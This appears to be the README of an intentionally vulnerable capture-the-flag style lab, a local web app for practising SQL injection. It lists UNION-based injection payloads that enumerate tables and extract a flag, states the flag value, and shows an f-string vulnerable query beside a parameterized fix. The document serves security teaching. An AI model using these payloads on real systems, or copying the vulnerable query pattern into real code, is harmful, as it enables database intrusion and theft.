# 🔓 Estonia Energy System Management - SQL Injection Demo

## 🚀 Quick Start

### 1. Start the system
```bash
./start_system.sh
```

### 2. Access the system
- Open: http://localhost:9000
- System is in English
- All functionality is available

### 3. Exploit SQL injection
```bash
python demo_sqli.py
```

## 🎯 Goal

**Get the flag:** `EST_ENERGY_SYSTEM_2024`

## 📚 Learning Resources

### SQL Injection Guide
- **URL:** http://localhost:9000/sql-guide
- **Features:** Complete guide with payloads, database schema, and tips

### API Endpoints
- **Database Schema:** http://localhost:9000/api/schema
- **Available Tables:** http://localhost:9000/api/tables
- **System Statistics:** http://localhost:9000/api/statistics

## 🔓 SQL Injection Exploitation

### Method 1: Automatic exploitation
```bash
python demo_sqli.py
```

### Method 2: Manual exploitation
1. Go to http://localhost:9000/search
2. Try basic SQL injection: `' OR '1'='1`
3. Test column count: `' UNION SELECT 1,2,3,4,5,6,7 --`
4. Get table names: `' UNION SELECT 1,name,1,1,1,1,1 FROM sqlite_master WHERE type='table' --`
5. Extract the flag: `' UNION SELECT 1,flag_value,1,1,1,1,1 FROM system_flags WHERE flag_name = 'TASK_COMPLETED' --`
6. Look for the flag in the results

### Method 3: Alternative payloads
```sql
-- Basic flag extraction (with correct column count)
' UNION SELECT 1,flag_value,1,1,1,1,1 FROM system_flags WHERE flag_name = 'TASK_COMPLETED' --

-- Get all flags
' UNION SELECT 1,flag_name,flag_value,1,1,1,1 FROM system_flags --

-- Basic SQL injection test
' OR '1'='1
```

## 📁 Project Structure

```
├── start_system.sh          # Start the system
├── demo_sqli.py            # SQL injection demo
├── app/                     # Application code
│   ├── main.py             # FastAPI app
│   ├── routes/             # Route handlers
│   ├── database/           # Database manager
│   └── static/             # Static files
├── templates/              # HTML templates
├── config/                 # Configuration
└── requirements.txt        # Dependencies
```

## 🛡️ Security Notes

**This is a demonstration project with intentional vulnerabilities for educational purposes.**

### Vulnerable Code:
```python
# VULNERABLE (SQL injection)
sql_query = f"SELECT * FROM power_stations WHERE name LIKE '%{query}%'"
```

### Secure Code:
```python
# SECURE (parameterized query)
cursor.execute("SELECT * FROM power_stations WHERE name LIKE ?", (f"%{query}%",))
```

## ⚖️ Legal Notice

**IMPORTANT:** This project is for educational purposes only. Using these techniques on real systems without permission is illegal.

**Use knowledge only for:**
- Learning and education
- Testing your own systems
- Authorized penetration testing
- Security research

---
**Remember: Security is everyone's responsibility!**